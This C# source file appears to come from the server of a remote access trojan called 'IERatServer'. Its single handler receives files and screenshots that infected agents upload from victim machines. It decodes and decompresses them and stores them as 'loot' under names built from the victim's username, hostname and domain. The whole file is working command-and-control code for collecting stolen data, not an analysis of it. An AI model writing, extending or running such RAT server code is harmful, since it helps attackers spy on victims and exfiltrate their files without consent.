using System;
using System.IO;

namespace IERatServer.lib
{
    class Actions
    {
        public static void HandleAdvancedTasks(RequestObject requestobject, TaskObject taskObject)
        {
            try
            {
                AgentChannel ActiveChannel = Db.GetChannelFromID(requestobject.AgentID);
                var agent = ActiveChannel.agent;
                string Filename = "";
                if (taskObject.args == "")  {
                    Filename = $"{agent.Username}-{agent.Hostname}-{agent.Domain}-{DateTime.Now.Day}{DateTime.Now.Month}{DateTime.Now.Year}-{DateTime.Now.Hour}{DateTime.Now.Minute}{DateTime.Now.Second}.jpg";
                }
                else {
                    Filename = $"{agent.Username}-{agent.Hostname}-{agent.Domain}-{DateTime.Now.Day}{DateTime.Now.Month}{DateTime.Now.Year}-{DateTime.Now.Hour}{DateTime.Now.Minute}{DateTime.Now.Second}-{taskObject.args}";
                }
                var filepath = Path.Combine(CLI.LootFolder, Filename);
                var destinationFile = File.Create(filepath);
                var fileBytes = ServerUtils.Decompress(Convert.FromBase64String(taskObject.Result));
                destinationFile.Write(fileBytes);
                destinationFile.Close();
                
                Console.ForegroundColor = ConsoleColor.Green;
                if (taskObject.Type == "download")
                {
                    CLI.ScreenMessage($"Download was successfull to [{filepath}]");
                    Logger.Log("info", $"Download was successfull from agent {requestobject.AgentID} [{taskObject.args}]");
                    taskObject.Result = $"Successfully downloaded to {filepath}";
                }
                if (taskObject.Type == "screenshot")
                {
                    CLI.ScreenMessage($"Screenshot saved successfully to {filepath}");
                    Logger.Log("info", $"Screenshot was successfull saved from agent {requestobject.AgentID} to file {filepath}");
                    taskObject.Result = "Screenshot saved successfully";
                }
                Console.ForegroundColor = ConsoleColor.White;

                Db.TaskHistory.Add(new TaskHistoryObject() {
                    AgentNumber = ActiveChannel.InteractNum,
                    AgentID = requestobject.AgentID,
                    task = taskObject });

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Logger.Log("error", ex.Message);
            }
        }
    }
}
